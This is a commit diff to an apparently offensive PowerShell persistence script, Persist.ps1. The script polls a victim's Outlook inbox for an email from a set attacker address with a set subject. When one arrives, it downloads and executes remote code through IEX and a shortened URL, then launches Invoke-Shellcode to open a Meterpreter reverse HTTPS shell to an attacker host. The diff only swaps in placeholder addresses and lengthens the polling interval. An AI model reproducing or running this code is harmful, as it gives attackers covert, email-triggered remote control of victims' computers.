9c1130151c4d91fa9678750a2c6bdb32a0a4cfba
enigma0x3 <matthew@webnelson.net>
2014-10-14 09:59:30 -0400

    Update Persist.ps1

--- Persist.ps1
+++ Persist.ps1
@@ -4,12 +4,16 @@ $outlook = new-object -com outlook.application;
 $ns = $outlook.GetNameSpace("MAPI");
 $inbox = $ns.GetDefaultFolder($olFolderInbox)
 $inbox.items | foreach { 
-if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
+if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "SPECIFIEDSUBJECT")
 {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 10.0.0.13 -LPORT 1111 -Force
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xx.xx.x.xxx -LPORT 1111 -Force
 Return}
   
 }
-start-sleep -s 10  
+
+start-sleep -s 900
+
 }
+
+
